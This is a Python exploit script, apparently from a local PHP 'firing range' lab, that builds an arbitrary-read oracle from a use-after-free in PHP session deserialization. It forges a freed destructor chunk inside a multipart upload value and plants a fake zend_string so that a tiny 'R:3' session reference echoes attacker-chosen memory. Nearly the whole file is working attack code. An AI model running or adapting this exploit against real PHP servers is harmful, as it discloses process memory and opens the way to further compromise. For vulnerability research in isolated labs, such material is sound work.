#!/usr/bin/env python3
"""smb_oracle6.py — THE ARBITRARY-READ ORACLE (attempt-8).

Proven: a 6-byte session `k|R:n;` decodes through the producer's intact
remnant (entries.used_slots=15, data[i] -> the dtor chunk slots) and the
flush writes the RESOLVED zval into the session file (k|s:185:"MK02..."
observed live through :8151).

Arbitrary read: the dtor chunk page (d->last_dtor, freed-but-intact) is
reclaimed by a ~4000B multipart VALUE part (<=4077: single-page copy) (single 1-page emalloc, no
realloc chain, best-fit exact). Its bytes = a forged var_dtor_entries:
  data[2] (chunk+0x30) = {fake zend_string ptr, IS_STRING_EX}
  fake string @ chunk+0x800 = {gc, h, len=16, "ORACLEWORKS!!!"}
=> R:3 resolves OUR zval => k = our string => writeback echoes it.
Swap the fake string for {len=*(TARGET), val=TARGET+8} => arbitrary read.
"""
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle2 as o2
from smb_oracle import stage, fire_main

BND = b"G"


def part(name, value):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"\r\n\r\n' + value + b"\r\n")


def file_part(name, value, filename=b"a.txt"):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name
            + b'"; filename="' + filename + b'"'
            b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")


def forge_chunk(chunk_addr, str_addr=None, str_len=16, str_data=b"ORACLEWORKS!!!"):
    """4000B value = forged var_dtor_entries at the chunk page."""
    b = bytearray(4000)  # <=4077: copy stays 1-page (never lands at d)
    struct.pack_into("<Q", b, 0x00, 13)          # used_slots (appends at 13+)
    struct.pack_into("<Q", b, 0x08, 0)           # next
    fs = str_addr if str_addr is not None else chunk_addr + 0x800
    struct.pack_into("<Q", b, 0x30, fs)          # data[2].value -> fake string
    struct.pack_into("<I", b, 0x38, 0x106)       # data[2].type = IS_STRING_EX
    # fake zend_string @ chunk+0x800
    struct.pack_into("<I", b, 0x800, 100)        # refcount
    struct.pack_into("<I", b, 0x804, 6)          # gc type IS_STRING
    struct.pack_into("<Q", b, 0x810, str_len)   # len
    b[0x818:0x818 + len(str_data)] = str_data
    return bytes(b)


def build_body(gsid, chunk_addr):
    g = forge_chunk(chunk_addr)
    return (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part(b"f", b"z" * 4096) +
            b"--" + BND + b"--\r\n")


def main():
    print("=== ORACLE v6: forged chunk + tiny R:3 session ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"o6{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    d = o2.find_bg()
    raw = s.read_mem("vuln", d, 0x18)
    chunk = int.from_bytes(raw[0x10:0x18], "little")
    print(f"d = {hex(d)}  dtor chunk = {hex(chunk)}")
    gsid = f"o6c{int(time.time())}"
    stage(gsid, b"k|R:3;")
    first = fire_main(build_body(gsid, chunk))
    print(f"consumer: {first}")
    rc, out = q.docker_exec(q.CT["vuln"], f"head -c 200 /tmp/sess_{gsid} 2>/dev/null")
    print(f"sess: {out[:160]!r}")
    hit = "ORACLEWORKS!!!" in out
    print(f"*** ARBITRARY-READ ORACLE {'LIVE!!!' if hit else 'not yet'} ***")
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
